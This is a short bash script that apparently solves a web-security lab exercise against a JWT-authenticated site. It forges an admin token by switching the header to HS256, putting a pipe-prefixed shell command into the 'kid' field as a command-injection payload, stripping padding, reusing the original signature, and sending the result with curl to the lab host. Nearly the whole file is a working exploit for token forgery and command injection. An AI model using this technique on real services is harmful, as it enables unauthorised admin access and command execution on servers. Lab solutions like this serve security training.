#!/bin/bash

# try a request with the original auth cookie
curl -i -k -X GET -b "auth=$(cat token.txt)" 'http://ptl-a840538a-52e2a666.libcurl.so/'

# change the signing algorithm from RSA to HMAC
echo -n '{"typ":"JWT","alg":"HS256","kid":"|/usr/local/bin/score 19a135f0-470f-4287-819d-a65fd42f23a6"}' | basenc --base64url -w 0 > token.evil.txt
echo -n '{"login":"admin"}' | basenc --base64url -w 0 | (echo -n '.' && cat) >> token.evil.txt

# remove all the padding from the base64 strings
perl -pi -e 's#=##g' token.evil.txt

# add a dummy signature, for example the one from the original token
cut -d '.' -f 3 < token.txt | (echo -n '.' && cat) >> token.evil.txt

# alternatively, this script will sign the payload:
# python solve.py

# send to the server
curl -i -k -X GET -b "auth=$(cat token.evil.txt)" 'http://ptl-a840538a-52e2a666.libcurl.so/'
